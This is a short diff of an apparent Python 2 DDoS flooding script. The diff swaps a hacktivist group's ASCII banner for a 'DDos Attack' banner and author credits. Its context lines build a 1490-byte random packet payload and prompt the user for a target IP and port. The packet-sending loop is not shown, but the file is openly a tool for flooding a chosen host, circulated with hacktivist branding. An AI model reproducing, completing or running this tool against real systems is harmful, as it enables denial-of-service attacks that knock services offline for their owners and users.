@@ -18,18 +18,15 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("figlet V-19 CREW")
+os.system("figlet DDos Attack")
 
-    print "VARIANS 19 CREW"
-    print "         __     __       _     ___       __    ____    ___  _         _  "
-    print "         \ \   / /      / |   / _ \     / _|  |  _ \  | __| \ \      / / "
-    print "          \ \ / /_____  | |  | (_) |   | |    | |_) | | __|  \ \ /\ / /  "
-    print "           \ V /|_____| | |  \__,  |   | |_   |  _<   | |_    \ V  V /   "
-    print "            \_/         |_|     /_/     \__|  |_| \_\ |___|    \_/\_/    "
-    print                                "LEADER:KUACIBASI"
-    print "                             CREATOR:MR.ASHFLYY                          "
-    print                           "#WE ARE MALAYSIAN HACKER "
-    print                           "#WE ARE MUSLIM HACKER"
+print
+print "Author   : DragonForceMy"
+print "Forum    : https://dragonforce.io"
+print "github   : https://github.com/waitercinta"
+print "Facebook : https://www.facebook.com/dragonforce.io"
+print "----------*Hak milik Rakyat Malaysia*---------------"
+print
 
 ip = raw_input("Masukkan IP Target : ")
 port = input  ("Masukkan Port      : ")
